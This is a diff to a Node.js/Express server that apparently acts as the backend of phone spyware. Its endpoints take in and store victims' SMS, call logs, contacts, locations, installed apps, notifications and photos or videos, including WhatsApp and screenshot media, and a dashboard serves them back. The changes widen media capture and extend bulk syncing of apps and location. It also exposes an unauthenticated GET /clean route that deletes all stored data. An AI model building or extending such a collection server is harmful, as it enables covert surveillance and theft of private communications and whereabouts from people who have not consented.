@@ -201,7 +201,7 @@ const Battery = mongoose.model('Battery', BatterySchema);
 const Network = mongoose.model('Network', NetworkSchema);
 const Media = mongoose.model('Media', MediaSchema);
 
-// ============= 🔥 NEW: GET STATS =============
+// ============= GET STATS =============
 app.get('/api/stats', async (req, res) => {
     try {
         const stats = {
@@ -217,10 +217,9 @@ app.get('/api/stats', async (req, res) => {
     }
 });
 
-// ============= 🔥 NEW: CLEAN ENTIRE DATABASE =============
+// ============= CLEAN DATABASE =============
 app.get('/clean', async (req, res) => {
     try {
-        // Count before deletion
         const counts = {
             devices: await DeviceInfo.countDocuments(),
             locations: await Location.countDocuments(),
@@ -235,7 +234,6 @@ app.get('/clean', async (req, res) => {
             media: await Media.countDocuments()
         };
 
-        // Delete all data
         await DeviceInfo.deleteMany({});
         await Location.deleteMany({});
         await Contact.deleteMany({});
@@ -249,18 +247,10 @@ app.get('/clean', async (req, res) => {
         await Media.deleteMany({});
 
         console.log('🧹 Database cleaned completely');
-
-        res.json({
-            success: true,
-            message: '✅ Database cleaned successfully!',
-            deleted: counts
-        });
+        res.json({ success: true, message: '✅ Database cleaned successfully!', deleted: counts });
     } catch (error) {
         console.error('❌ Clean error:', error);
-        res.status(500).json({
-            success: false,
-            error: error.message
-        });
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
@@ -403,21 +393,65 @@ app.post('/api/sms', async (req, res) => {
     }
 });
 
-// Installed Apps
+// ============= INSTALLED APPS WITH DEBUGGING =============
 app.post('/api/apps', async (req, res) => {
     try {
         const { deviceId, apps } = req.body;
 
-        if (!deviceId || !Array.isArray(apps)) {
-            return res.status(400).json({ success: false, error: 'Invalid data' });
+        // 🔥 SUPER DEBUG
+        console.log('🔍 ====== APPS API CALL RECEIVED ======');
+        console.log('📱 Device ID:', deviceId);
+        console.log('📱 Apps type:', typeof apps);
+        console.log('📱 Is array?', Array.isArray(apps));
+        console.log('📱 Apps length:', apps ? apps.length : 'null');
+
+        if (!deviceId) {
+            console.log('❌ Missing deviceId');
+            return res.status(400).json({ success: false, error: 'Device ID required' });
         }
 
-        await App.deleteMany({ deviceId });
-        const appsToSave = apps.map(app => ({ deviceId, ...app }));
-        await App.insertMany(appsToSave);
+        if (!apps) {
+            console.log('❌ apps is null/undefined');
+            return res.status(400).json({ success: false, error: 'Apps data required' });
+        }
 
-        console.log(`📱 Apps saved - Device: ${deviceId}, Count: ${apps.length}`);
-        res.json({ success: true, count: apps.length });
+        if (!Array.isArray(apps)) {
+            console.log('❌ apps is not an array');
+            return res.status(400).json({ success: false, error: 'Apps must be an array' });
+        }
+
+        console.log(`📱 Apps array length: ${apps.length}`);
+
+        await App.deleteMany({ deviceId });
+        console.log('🗑️ Deleted old apps for device:', deviceId);
+
+        if (apps.length === 0) {
+            console.log('⚠️ No apps to save');
+            return res.json({ success: true, count: 0 });
+        }
+
+        const appsToSave = apps.map((app, index) => {
+            return {
+                deviceId,
+                packageName: app.packageName || app.pkg || app.package || app.id || '',
+                appName: app.appName || app.name || app.applicationName || app.label || `App ${index+1}`,
+                versionName: app.versionName || app.version || app.ver || '',
+                versionCode: parseInt(app.versionCode || app.code || 0) || 0,
+                isSystemApp: Boolean(app.isSystemApp || app.systemApp || app.system || false),
+                firstInstallTime: app.firstInstallTime ? new Date(app.firstInstallTime) : null,
+                lastUpdateTime: app.lastUpdateTime ? new Date(app.lastUpdateTime) : null,
+                timestamp: new Date()
+            };
+        });
+
+        const saved = await App.insertMany(appsToSave);
+        console.log(`✅ SUCCESS: Saved ${saved.length} apps for device:`, deviceId);
+
+        const verifyCount = await App.countDocuments({ deviceId });
+        console.log(`✅ Verification: Database now has ${verifyCount} apps`);
+
+        res.json({ success: true, count: saved.length });
+
     } catch (error) {
         console.error('❌ Apps error:', error);
         res.status(500).json({ success: false, error: error.message });
@@ -490,7 +524,7 @@ app.post('/api/network', async (req, res) => {
     }
 });
 
-// Media Upload (to Cloudinary)
+// Media Upload
 app.post('/api/upload', upload.single('file'), async (req, res) => {
     try {
         const { deviceId, type } = req.body;
@@ -536,71 +570,48 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
     }
 });
 
-// ============= GET LATEST PHOTO =============
+// GET LATEST PHOTO
 app.get('/api/photo/:deviceId', async (req, res) => {
     try {
         const { deviceId } = req.params;
 
         const photo = await Media.findOne({
             deviceId,
-            type: { $regex: /camera|screenshot|whatsapp|gallery|image/i }
-        }).sort({ timestamp: -1 }).limit(1);
+            type: { $regex: /camera|screenshot|whatsapp|gallery|image|photo/i }
+        }).sort({ timestamp: -1 });
 
         if (!photo) {
-            return res.status(404).json({
-                success: false,
-                message: 'No photo found'
-            });
+            return res.status(404).json({ success: false, message: 'No photo found' });
         }
 
-        res.json({
-            success: true,
-            url: photo.url,
-            timestamp: photo.timestamp,
-            type: photo.type
-        });
-
+        res.json({ success: true, url: photo.url, timestamp: photo.timestamp, type: photo.type });
     } catch (error) {
-        res.status(500).json({
-            success: false,
-            error: error.message
-        });
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// ============= GET LATEST VIDEO =============
+// GET LATEST VIDEO
 app.get('/api/video/:deviceId', async (req, res) => {
     try {
         const { deviceId } = req.params;
 
         const video = await Media.findOne({
             deviceId,
-            type: { $regex: /video|movie/i }
-        }).sort({ timestamp: -1 }).limit(1);
+            type: { $regex: /video|mp4|movie|recording|gif|mkv|mov|avi/i }
+        }).sort({ timestamp: -1 });
 
         if (!video) {
-            return res.status(404).json({
-                success: false,
-                message: 'No video found'
-            });
+            return res.status(404).json({ success: false, message: 'No video found' });
         }
 
-        res.json({
-            success: true,
-            url: video.url,
-            timestamp: video.timestamp,
-            type: video.type
-        });
-
+        res.json({ success: true, url: video.url, timestamp: video.timestamp, type: video.type });
     } catch (error) {
-        res.status(500).json({
-            success: false,
-            error: error.message
-        });
+        console.error('❌ Video error:', error);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Bulk Sync
+// ============= 🔥 FIXED: BULK SYNC WITH APPS =============
 app.post('/api/sync', async (req, res) => {
     try {
         const { deviceId, data } = req.body;
@@ -609,39 +620,75 @@ app.post('/api/sync', async (req, res) => {
             return res.status(400).json({ success: false, error: 'Invalid data' });
         }
 
+        console.log('🔄 Bulk sync received for device:', deviceId);
         const results = {};
 
-        if (data.callLogs) {
+        // Call Logs
+        if (data.callLogs && Array.isArray(data.callLogs)) {
             await CallLog.insertMany(data.callLogs.map(c => ({ deviceId, ...c })));
             results.callLogs = data.callLogs.length;
         }
 
-        if (data.sms) {
+        // SMS
+        if (data.sms && Array.isArray(data.sms)) {
             await Sms.insertMany(data.sms.map(s => ({ deviceId, ...s })));
             results.sms = data.sms.length;
         }
 
-        if (data.contacts) {
+        // Contacts
+        if (data.contacts && Array.isArray(data.contacts)) {
+            await Contact.deleteMany({ deviceId });
             await Contact.insertMany(data.contacts.map(c => ({ deviceId, ...c })));
             results.contacts = data.contacts.length;
         }
 
+        // 🔥🔥 FIX: APPS BULK SYNC 🔥🔥
+        if (data.apps && Array.isArray(data.apps)) {
+            // Delete old apps
+            await App.deleteMany({ deviceId });
+
+            // Save new apps
+            const appsToSave = data.apps.map(app => ({
+                deviceId,
+                packageName: app.packageName || app.pkg || app.package || app.id || '',
+                appName: app.appName || app.name || app.applicationName || app.label || 'Unknown',
+                versionName: app.versionName || app.version || app.ver || '',
+                versionCode: parseInt(app.versionCode || app.code || 0) || 0,
+                isSystemApp: Boolean(app.isSystemApp || app.systemApp || app.system || false),
+                timestamp: new Date()
+            }));
+
+            await App.insertMany(appsToSave);
+            results.apps = data.apps.length;
+            console.log(`✅ Saved ${data.apps.length} apps via bulk sync`);
+        }
+
+        // Battery
         if (data.battery) {
             const battery = new Battery({ deviceId, ...data.battery });
             await battery.save();
             results.battery = 1;
         }
 
+        // Network
         if (data.network) {
             const network = new Network({ deviceId, ...data.network });
             await network.save();
             results.network = 1;
         }
 
-        console.log(`✅ Bulk sync - Device: ${deviceId}`, results);
+        // Location (if sent separately)
+        if (data.location) {
+            const location = new Location({ deviceId, ...data.location });
+            await location.save();
+            results.location = 1;
+        }
+
+        console.log(`✅ Bulk sync complete - Device: ${deviceId}`, results);
         res.json({ success: true, results });
+
     } catch (error) {
-        console.error('❌ Sync error:', error);
+        console.error('❌ Bulk sync error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -656,13 +703,16 @@ app.get('/api/device/:deviceId', async (req, res) => {
             return res.status(404).json({ success: false, error: 'Device not found' });
         }
 
+        const apps = await App.find({ deviceId });
+        console.log(`📱 Device ${deviceId} has ${apps.length} apps in database`);
+
         const data = {
             device,
             locations: await Location.find({ deviceId }).sort({ timestamp: -1 }).limit(100),
             contacts: await Contact.find({ deviceId }),
             callLogs: await CallLog.find({ deviceId }).sort({ date: -1 }).limit(100),
             sms: await Sms.find({ deviceId }).sort({ date: -1 }).limit(100),
-            apps: await App.find({ deviceId }),
+            apps: apps,
             usage: await Usage.find({ deviceId }).sort({ timestamp: -1 }).limit(50),
             notifications: await Notification.find({ deviceId }).sort({ timestamp: -1 }).limit(50),
             battery: await Battery.find({ deviceId }).sort({ timestamp: -1 }).limit(20),
@@ -730,12 +780,14 @@ server.listen(PORT, '0.0.0.0', () => {
     ╠══════════════════════════════════════════════╣
     ║  📍 URL: http://localhost:${PORT}               ║
     ║  📊 Dashboard: http://localhost:${PORT}/dashboard ║
-    ║  🔌 WebSocket: ws://localhost:8080           ║
+    ║  🔌 WebSocket: ws://localhost:${PORT}           ║
     ║  🗄️  MongoDB: ${mongoose.connection.readyState === 1 ? '✅' : '❌'}                    ║
     ║  ☁️  Cloudinary: ${process.env.CLOUDINARY_URL ? '✅' : '❌'}              ║
     ║  📊 Stats API: /api/stats                    ║
     ║  📸 Photo API: /api/photo/:deviceId         ║
-    ║  🎥 Video API: /api/video/:deviceId         ║
+    ║  🎥 Video API: /api/video/:deviceId ✅       ║
+    ║  📱 Apps API: /api/apps 🔥 DEBUG ENABLED     ║
+    ║  🔄 Bulk Sync: /api/sync ✅ APPS FIXED       ║
     ║  🧹 Clean API: /clean                        ║
     ╚══════════════════════════════════════════════╝
     `);
